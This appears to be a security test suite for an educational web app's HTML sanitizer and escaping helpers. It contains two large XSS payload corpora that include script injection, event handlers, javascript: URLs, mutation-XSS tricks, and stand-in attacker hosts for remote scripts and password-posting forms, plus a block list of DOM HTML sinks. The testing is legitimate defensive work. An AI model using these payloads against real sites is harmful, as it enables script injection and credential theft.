import assert from "node:assert/strict";
import { readdirSync, readFileSync } from "node:fs";
import { join, relative } from "node:path";
import { runInNewContext } from "node:vm";
import { fileURLToPath } from "node:url";
import { JSDOM } from "jsdom";
import test from "node:test";
import { appendHtml, clearElement, insertHtmlAfter, safeUrl, serializeChildren, setHtml } from "../js/dom.js";

const root = new URL("../", import.meta.url);
const read = path => readFileSync(fileURLToPath(new URL(path, root)), "utf8");

function createSanitizer(dom) {
  runInNewContext(read("js/sanitize-html.js"), {
    window: dom.window,
    document: dom.window.document,
    Node: dom.window.Node,
    location: dom.window.location,
    URL
  });
  return dom.window.sanitizeRichHtml;
}

function extractEscapeHtml(source) {
  const start = source.indexOf("function escapeHtml(");
  assert.notEqual(start, -1, "page should define an HTML text encoder");
  const open = source.indexOf("{", start);
  let depth = 0;
  let quote = null;
  for (let index = open; index < source.length; index++) {
    const character = source[index];
    if (quote) {
      if (character === "\\") index++;
      else if (character === quote) quote = null;
      continue;
    }
    if (character === "'" || character === '"' || character === "`") {
      quote = character;
      continue;
    }
    if (character === "/") {
      let inCharacterClass = false;
      for (index++; index < source.length; index++) {
        if (source[index] === "\\") index++;
        else if (source[index] === "[") inCharacterClass = true;
        else if (source[index] === "]") inCharacterClass = false;
        else if (source[index] === "/" && !inCharacterClass) break;
      }
      continue;
    }
    if (character === "{") depth++;
    else if (character === "}" && --depth === 0) return source.slice(start, index + 1);
  }
  assert.fail("page escapeHtml helper should have balanced braces");
}

test("lesson and homework sanitize rich content before inserting HTML", () => {
  for (const [path, script] of [
    ["lesson.html", "js/pages/lesson.js"],
    ["homework.html", "js/pages/homework.js"]
  ]) {
    const page = read(path);
    const pageScript = read(script);
    assert.match(page, /src="js\/sanitize-html\.js"/, `${path} should load the sanitizer`);
    assert.match(page, /type="module" src=/, `${path} should load its page module`);
    assert.match(pageScript, /sanitizeRichHtml\(savedHtml\)/, `${path} should sanitize saved annotations`);
  }
  assert.match(read("js/pages/homework.js"), /sanitizeRichHtml\(m\.ex\)/);
  assert.equal((read("js/pages/lesson.js").match(/sanitizeRichHtml\(item\.ex\)/g) || []).length, 2);
});

test("the DOM helpers set, append, insert, clear, and serialize fragments", () => {
  const previousDocument = globalThis.document;
  const dom = new JSDOM("", { url: "https://studio.example/" });
  globalThis.document = dom.window.document;
  try {
    const host = document.createElement("div");
    setHtml(host, "<p>First</p>");
    appendHtml(host, "<p>Last</p>");
    insertHtmlAfter(host.firstElementChild, "<p>Middle</p>");
    assert.deepEqual(
      Array.from(host.children, child => child.textContent),
      ["First", "Middle", "Last"]
    );
    assert.equal(serializeChildren(host), "<p>First</p><p>Middle</p><p>Last</p>");
    clearElement(host);
    assert.equal(host.childNodes.length, 0);
    assert.equal(safeUrl("javascript:alert(1)", "https://studio.example/"), null);
    assert.equal(safeUrl("data:text/html,payload", "https://studio.example/"), null);
    assert.equal(safeUrl("/homework.html", "https://studio.example/").href, "https://studio.example/homework.html");
    assert.equal(
      safeUrl("https://external.example/homework", "https://studio.example/").href,
      "https://external.example/homework"
    );
  } finally {
    if (previousDocument === undefined) delete globalThis.document;
    else globalThis.document = previousDocument;
    dom.window.close();
  }
});

test("sanitizer allowlists formatting and strips active content and unsafe URLs", () => {
  const sanitizer = read("js/sanitize-html.js");
  assert.match(sanitizer, /allowedTags = new Set/);
  assert.match(sanitizer, /contentlessTags = new Set/);
  assert.match(sanitizer, /removeAttribute/);
  assert.match(sanitizer, /url\.protocol === "https:"/);
  assert.match(read("sw.js"), /"js\/sanitize-html\.js"/);
});

test("sanitizer rejects a 50-payload XSS corpus", () => {
  const payloads = [
    "<script>alert(1)</script>",
    "<script src=https://attacker.invalid/x.js></script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><foreignObject><p>payload</p></foreignObject></svg>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<object data=javascript:alert(1)>payload</object>",
    "<embed src=javascript:alert(1)>",
    "<form action=javascript:alert(1)><button>submit</button></form>",
    "<input autofocus onfocus=alert(1)>",
    "<button onclick=alert(1)>click</button>",
    "<details open ontoggle=alert(1)>details</details>",
    "<marquee onstart=alert(1)>text</marquee>",
    "<video onerror=alert(1)><source src=x></video>",
    "<audio src=x onerror=alert(1)>",
    "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
    "<style>@import 'javascript:alert(1)';</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<meta http-equiv=refresh content=\"0;javascript:alert(1)\">",
    "<base href=https://attacker.invalid/>",
    "<a href=javascript:alert(1)>link</a>",
    "<a href=\"JaVaScRiPt:alert(1)\">link</a>",
    "<a href=\"java&#x73;cript:alert(1)\">link</a>",
    "<a href=\"data:text/html,<script>alert(1)</script>\">link</a>",
    "<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">",
    "<img src=\"javascript:alert(1)\">",
    "<img srcset=\"x 1x, javascript:alert(1) 2x\">",
    "<div onmouseover=alert(1)>hover</div>",
    "<p onmouseenter=alert(1)>text</p>",
    "<span onanimationstart=alert(1)>text</span>",
    "<select onfocus=alert(1)><option>item</option></select>",
    "<textarea oninput=alert(1)>text</textarea>",
    "<table background=javascript:alert(1)><tr><td>cell</td></tr></table>",
    "<div style=\"background:url(javascript:alert(1))\">text</div>",
    "<a href=\"vbscript:msgbox(1)\">link</a>",
    "<a href=\"file:///etc/passwd\">link</a>",
    "<xss onload=alert(1)>payload</xss>",
    "<noscript><img src=x onerror=alert(1)></noscript>",
    "<template><script>alert(1)</script></template>",
    "<svg><a xlink:href=\"javascript:alert(1)\">link</a></svg>",
    "<img src=x onerror=\"&#x61;lert(1)\">",
    "<img src=x ONERROR=alert(1)>",
    "<div data-x=\"<script>alert(1)</script>\">text</div>",
    "<a href=\"https://studio.example/safe\">safe link</a>",
    "<p><strong>safe rich text</strong></p>",
    "<p><img src=\"https://studio.example/image.png\" alt=\"safe image\"></p>",
    "<a href=\"//attacker.invalid/path\">external link</a>"
  ];
  assert.equal(payloads.length, 50);

  const previousDocument = globalThis.document;
  const dom = new JSDOM("", { url: "https://studio.example/" });
  globalThis.document = dom.window.document;
  const sanitizeRichHtml = createSanitizer(dom);
  try {
    const host = document.createElement("div");
    for (const payload of payloads) {
      setHtml(host, sanitizeRichHtml(payload));
      assert.equal(
        host.querySelector("script, iframe, object, embed, svg, math, form, input, video, audio, style, link, meta, base"),
        null,
        `active element survived for payload ${payload}`
      );
      for (const element of host.querySelectorAll("*")) {
        for (const attribute of element.attributes) {
          assert.doesNotMatch(attribute.name, /^on/i, `event attribute survived for payload ${payload}`);
          if (["href", "src"].includes(attribute.name)) {
            assert.doesNotMatch(attribute.value, /^\s*(javascript|vbscript|data|file):/i);
          }
        }
      }
    }
  } finally {
    if (previousDocument === undefined) delete globalThis.document;
    else globalThis.document = previousDocument;
    dom.window.close();
  }
});

for (const [page, scriptPath] of [
  ["teacher dashboard", "js/pages/dashboard.js"],
  ["student portal", "js/pages/portal.js"]
]) {
  test(`${page} renders injected student names as text`, () => {
    const source = read(scriptPath);
    const escapeHtml = extractEscapeHtml(source);
    const payload = `"><img src=x onerror="alert(1)"> & '`;
    const encoded = runInNewContext(`${escapeHtml}\nescapeHtml(input)`, { input: payload });
    const previousDocument = globalThis.document;
    const dom = new JSDOM("", { url: "https://studio.example/" });
    globalThis.document = dom.window.document;
    try {
      const host = document.createElement("div");
      setHtml(host, `<span>${encoded}</span>`);
      assert.equal(host.querySelector("img"), null);
      assert.equal(host.textContent, payload);
    } finally {
      if (previousDocument === undefined) delete globalThis.document;
      else globalThis.document = previousDocument;
      dom.window.close();
    }
  });
}

for (const [page, scriptPath] of [
  ["lesson", "js/pages/lesson.js"],
  ["homework", "js/pages/homework.js"]
]) {
  test(`${page} sanitizes injected content and saved notes`, () => {
    const source = read(scriptPath);
    const escapeHtml = extractEscapeHtml(source);
    assert.match(source, /sanitizeRichHtml\(savedHtml\)/);
    const payload = `<img src=x onerror="alert(1)"><script>alert(2)</script>`;
    const encoded = runInNewContext(`${escapeHtml}\nescapeHtml(input)`, { input: payload });
    const previousDocument = globalThis.document;
    const dom = new JSDOM("", { url: "https://studio.example/" });
    globalThis.document = dom.window.document;
    const sanitizeRichHtml = createSanitizer(dom);
    try {
      const host = document.createElement("div");
      setHtml(host, `<p>${encoded}</p>`);
      assert.equal(host.querySelector("img, script"), null);
      setHtml(host, sanitizeRichHtml(payload));
      assert.equal(host.querySelector("script"), null);
      assert.equal(host.querySelector("[onerror]"), null);
    } finally {
      if (previousDocument === undefined) delete globalThis.document;
      else globalThis.document = previousDocument;
      dom.window.close();
    }
  });
}

test("application pages contain no direct DOM HTML sinks", () => {
  const collectJavaScript = directory => readdirSync(directory, { withFileTypes: true })
    .flatMap(entry => {
      const path = join(directory, entry.name);
      return entry.isDirectory() ? collectJavaScript(path) :
        entry.isFile() && path.endsWith(".js") ? [path] : [];
    });
  const applicationFiles = collectJavaScript(fileURLToPath(new URL("js/", root)))
    .map(path => relative(fileURLToPath(root), path).replace(/\\/g, "/"))
    .filter(path => !["js/dom.js", "js/sanitize-html.js"].includes(path));
  const forbidden = /innerHTML|outerHTML|insertAdjacentHTML|document\.write/;
  for (const path of applicationFiles) {
    assert.doesNotMatch(read(path), forbidden, `${path} should use the shared DOM helpers`);
  }
  for (const path of [
    "index.html", "legacy/index.html", "portal.html", "dashboard.html", "lesson.html",
    "lesson_abay.html", "lesson_gaziz.html", "homework.html", "practice.html", "clip.html",
    "manga.html", "placement.html", "offline.html", "tools/import-content.html"
  ]) {
    assert.doesNotMatch(read(path), forbidden, `${path} should not contain a direct DOM HTML sink`);
  }
  assert.match(read("js/dom.js"), /template\.innerHTML/);
  assert.match(read("js/sanitize-html.js"), /sanitizeRichHtml/);
});

test("dashboard uses delegated actions and validates dynamic parameters", () => {
  const dashboard = read("js/pages/dashboard.js");
  assert.match(dashboard, /data-action="approve-pending-student" data-uid=/);
  assert.match(dashboard, /data-action="undo-teacher-action" data-id=/);
  assert.match(dashboard, /readActionParam\(element, "uid", \/\^\[A-Za-z0-9_-\]\{1,128\}\$\/\)/);
  assert.match(dashboard, /data-action="select-student" data-code="' \+ escapeHtml\(code\)/);

  const htmlHelper = dashboard.match(/function escapeHtml\(s\) \{[\s\S]*?\r?\n\}/);
  assert.ok(htmlHelper, "dashboard should define HTML-safe attribute encoding");
  const payload = `');alert(1)//<img src=x onerror="alert(2)">&`;
  const encoded = runInNewContext(`${htmlHelper[0]}\nescapeHtml(${JSON.stringify(payload)})`);
  assert.doesNotMatch(encoded, /[<>"']/);
  assert.match(encoded, /&#39;/);
});

test("lesson and homework use delegated actions for annotations and review", () => {
  const lesson = read("js/pages/lesson.js");
  const homework = read("js/pages/homework.js");
  assert.match(lesson, /data-action="edit-note" data-note-id=/);
  assert.match(lesson, /data-action="delete-note" data-note-id=/);
  assert.match(lesson, /data-action="flag-for-review"/);
  assert.match(homework, /data-action="edit-note" data-note-id=/);
  assert.match(homework, /data-action="delete-note" data-note-id=/);
  assert.ok(lesson.includes('/^(?:note|legacy)_'));
  assert.ok(homework.includes('/^(?:note|legacy)_'));
  assert.doesNotMatch(lesson, /onerror="this\.parentNode/);
  assert.match(lesson, /escapeHtml\(w\.emoji\|\|'📖'\)/);
  assert.match(lesson, /setHtml\(lEl,.*escapeHtml\(title\)/);
  assert.match(lesson, /escapeHtml\(e\.message\)/);
});

test("student portal escapes lesson content and coerces scores to numbers", () => {
  const portal = read("js/pages/portal.js");
  assert.match(portal, /escapeHtml\(lesson\.icon \|\| '📘'\)/);
  assert.match(portal, /escapeHtml\(lesson\.title \|\| 'Untitled lesson'\)/);
  assert.match(portal, /Number\(state\.progress\.scores\[/);
  assert.match(portal, /escapeHtml\(code\)/);
});

const xssCorpus = [
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)">',
  '<IMG SRC=x ONERROR=alert(1)>',
  '<img src=javascript:alert(1)>',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<script>alert(1)</script>',
  '<ScRiPt>alert(1)</sCrIpT>',
  '<script src=https://evil.example/x.js></script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java&#x0A;script:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="//evil.example/phish">x</a>',
  '<a href="http://evil.example/">x</a>',
  '<a href="https://ok.example/" onclick="alert(1)">x</a>',
  '<a href="https://ok.example/" style="position:fixed;inset:0">x</a>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example/x.swf"></object>',
  '<embed src="https://evil.example/x.swf">',
  '<form action="https://evil.example"><input name=password><button>go</button></form>',
  '<input autofocus onfocus=alert(1)>',
  '<select autofocus onfocus=alert(1)><option>1</option></select>',
  '<textarea autofocus onfocus=alert(1)></textarea>',
  '<button onclick="alert(1)">x</button>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="width:expression(alert(1))">x</div>',
  '<style>@import "https://evil.example/x.css";</style>',
  '<style>*{display:none}</style>',
  '<link rel=stylesheet href=https://evil.example/x.css>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="https://evil.example/">',
  '<body onload=alert(1)>',
  '<details open ontoggle=alert(1)>x</details>',
  '<video><source onerror=alert(1)></video>',
  '<audio src=x onerror=alert(1)></audio>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<p onmouseover="alert(1)">hover</p>',
  '<span data-vocab="x" onmouseenter="alert(1)">x</span>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<table><caption><img src=x onerror=alert(1)></caption></table>',
  '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>',
  '<p>&#60;script&#62;alert(1)&#60;/script&#62;</p>',
  '<img src="x" alt="&quot; onerror=&quot;alert(1)">',
  '<img src=x alt=`onerror=alert(1)`>',
  '<a href="https://ok.example/"><img src=x onerror=alert(1)></a>',
  '<\u0000script>alert(1)</script>',
  '<img src=x onerror\u0000=alert(1)>',
  '<scrİpt>alert(1)</scrİpt>',
  '＜script＞alert(1)＜/script＞',
  '<img src="https://ok.example/x.png" loading=lazy onload=alert(1)>',
  '<div><div><div><div><img src=x onerror=alert(1)></div></div></div></div>',
  '<p><b><i><p>nested</b></i> malformed <img src=x onerror=alert(1)>',
  '<!--><img src=x onerror=alert(1)>-->',
  '<![CDATA[<img src=x onerror=alert(1)>]]>',
  '<?xml version="1.0"?><img src=x onerror=alert(1)>'
];

const forbiddenElements = "script, iframe, object, embed, svg, math, style, link, meta, base, form, input, select, textarea, video, audio, source, noscript, marquee, details";

function assertSafeOutput(markup, payload) {
  const output = new JSDOM(`<body>${markup}</body>`, { url: "https://example.test/" }).window.document;
  assert.equal(output.querySelectorAll(forbiddenElements).length, 0, `forbidden element survived: ${payload}`);
  for (const element of output.querySelectorAll("*")) {
    for (const attribute of element.attributes) {
      assert.doesNotMatch(attribute.name, /^on/i, `event handler survived: ${payload}`);
      assert.notEqual(attribute.name, "style", `style attribute survived: ${payload}`);
      assert.notEqual(attribute.name, "srcdoc", `srcdoc survived: ${payload}`);
      assert.notEqual(attribute.name, "formaction", `formaction survived: ${payload}`);
      if (["href", "src"].includes(attribute.name)) {
        const resolved = new URL(attribute.value, "https://example.test/");
        assert.equal(resolved.protocol, "https:", `non-https URL survived: ${payload}`);
      }
    }
  }
}

test("sanitizer neutralises an XSS corpus of 60+ payloads and is idempotent (no mutation XSS)", () => {
  assert.ok(xssCorpus.length >= 60, "corpus should contain at least 60 payloads");
  const dom = new JSDOM("<!doctype html><body></body>", { url: "https://example.test/" });
  const sanitize = createSanitizer(dom);
  for (const payload of xssCorpus) {
    const once = sanitize(payload);
    assertSafeOutput(once, payload);
    const twice = sanitize(once);
    assert.equal(twice, once, `sanitizer output must be stable under re-parsing: ${payload}`);
  }
});

test("sanitizer keeps benign teacher markup", () => {
  const dom = new JSDOM("<!doctype html><body></body>", { url: "https://example.test/" });
  const sanitize = createSanitizer(dom);
  const output = sanitize('<p>She <strong>has</strong> <span class="v-word" data-vocab="run">run</span> <a href="https://ok.example/x">link</a></p>');
  assert.match(output, /<strong>has<\/strong>/);
  assert.match(output, /data-vocab="run"/);
  assert.match(output, /href="https:\/\/ok\.example\/x"/);
});
